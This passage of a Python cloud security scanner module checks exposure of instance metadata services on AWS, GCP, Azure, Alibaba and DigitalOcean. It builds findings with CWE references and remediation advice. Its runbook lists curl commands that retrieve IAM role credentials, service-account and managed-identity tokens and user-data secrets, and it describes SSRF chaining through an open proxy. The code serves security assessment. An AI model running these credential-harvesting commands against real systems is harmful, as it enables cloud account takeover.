                f"{len(ali['user_data_secrets'])} match(es): {kinds}.",
                "curl -s http://100.100.100.200/latest/user-data",
                "Never inject secrets via user-data — use Alibaba KMS.",
                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))

    do = probe_result.get("digitalocean") or {}
    if do.get("reachable"):
        det = (f"droplet_id={do.get('droplet_id')} region={do.get('region')} "
               f"hostname={do.get('hostname')} "
               f"public_keys={len(do.get('public_keys') or [])}")
        if do.get("user_data_secrets"):
            out.append(_finding(
                "critical", "DigitalOcean user-data leaks secrets", tgt,
                f"{det}. Extracted "
                f"{len(do['user_data_secrets'])} credential-shaped match(es).",
                "curl -s http://169.254.169.254/metadata/v1.json",
                "Do not ship secrets in droplet user-data; rotate any exposed.",
                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))
        else:
            out.append(_finding(
                "medium", "DigitalOcean droplet metadata disclosed", tgt, det,
                "curl -s http://169.254.169.254/metadata/v1.json",
                "Metadata is unauthenticated by design on DO; treat any "
                "workload reach to /metadata as a foothold indicator.",
                ["CWE-200"], kind="instance_identity_disclosed"))
    return out


def proxy_findings(pr: dict, target_label: str = "imds-via-proxy") -> list[dict]:
    if not pr:
        return []
    if not (pr.get("absolute_form_ok") or pr.get("connect_tunnel_ok")):
        return []
    modes = []
    if pr.get("absolute_form_ok"):
        modes.append("absolute-URI form")
    if pr.get("connect_tunnel_ok"):
        modes.append("CONNECT tunnel")
    return [_finding(
        "critical",
        "IMDS reachable through host's HTTP proxy (Capital One 2019 pattern)",
        f"{target_label} via {pr.get('proxy','?')}",
        f"An HTTP proxy on this host ({pr.get('proxy','?')}) will proxy "
        f"requests to the link-local metadata service via: {', '.join(modes)}. "
        f"Any remote SSRF against an app that sends its outbound traffic "
        f"through this proxy becomes IMDS access, even when direct link-local "
        f"connectivity from the app is blocked.",
        f"curl -x http://{pr.get('proxy','?')} http://169.254.169.254/latest/meta-data/",
        "Block link-local (169.254.0.0/16) destinations at the proxy; do not "
        "run an open forward proxy on a cloud VM; use IMDSv2-only + hop-limit=1 "
        "so an intermediary cannot reach the metadata service.",
        ["CWE-918"], kind="imds_reachable_via_proxy")]


def runbook(host: str = AWS_HOST) -> list[dict]:
    return [
        {"step": "TCP reach test",
         "cmd": f"bash -c 'exec 3<>/dev/tcp/{host}/80 && echo up'"},
        {"step": "AWS IMDSv2 token",
         "cmd": f"curl -sX PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
                f"http://{host}/latest/api/token"},
        {"step": "AWS role credentials",
         "cmd": f"curl -sH 'X-aws-ec2-metadata-token: TOKEN' "
                f"http://{host}/latest/meta-data/iam/security-credentials/"},
        {"step": "AWS user-data",
         "cmd": f"curl -sH 'X-aws-ec2-metadata-token: TOKEN' "
                f"http://{host}/latest/user-data"},
        {"step": "GCP SA token",
         "cmd": "curl -sH 'Metadata-Flavor: Google' "
                "http://metadata.google.internal/computeMetadata/v1/"
                "instance/service-accounts/default/token"},
        {"step": "Azure managed identity token",
         "cmd": f"curl -sH 'Metadata: true' 'http://{host}/metadata/identity/"
                "oauth2/token?api-version=2018-02-01"
                "&resource=https://management.azure.com/'"},
        {"step": "Alibaba RAM STS",
         "cmd": "curl -s http://100.100.100.200/latest/meta-data/ram/"
                "security-credentials/"},
        {"step": "DigitalOcean droplet metadata",
         "cmd": f"curl -s http://{host}/metadata/v1.json"},
    ]


def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "cloud_metadata", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            probe_from_runner: bool = True) -> dict:
    """Analyze cloud metadata exposure. Unlike port-based service modules,
    IMDS is opportunistic:

      * `probe_from_runner=True` (default) tries the sweep from the recce
        runner box itself — succeeds only when recce is executed inside a
        cloud VPC (or on the cloud instance directly).
      * Session-side probing is initiated by the sessions/agent layer and
        feeds probe results back through `findings(probe_result)` — this
        analyzer does not spawn its own session traffic.
      * Web-SSRF chaining is initiated by crawl.py via `exploit_via_ssrf`
        and its results are surfaced through the same `findings()` path.

    Returns the standard {targets, findings, runbooks, probes, stats} shape."""
    del hosts, creds, budget, progress
    probes: dict = {}
    fs: list[dict] = []
    if active and probe_from_runner:
        pr = probe(AWS_HOST, _DEFAULT_PORT, _TIMEOUT)
        if pr.get("reachable"):
            probes["runner"] = pr
            fs.extend(findings(pr, target_label="runner"))
    runbooks = [{"target": "runner", "ip": "", "credfree": runbook(AWS_HOST),
                 "credentialed": []}]
    return {"targets": [{"ip": "", "port": _DEFAULT_PORT, "version": ""}],
            "findings": fs, "runbooks": runbooks, "probes": probes,
            "stats": {"targets": len(probes), "findings": len(fs)}}
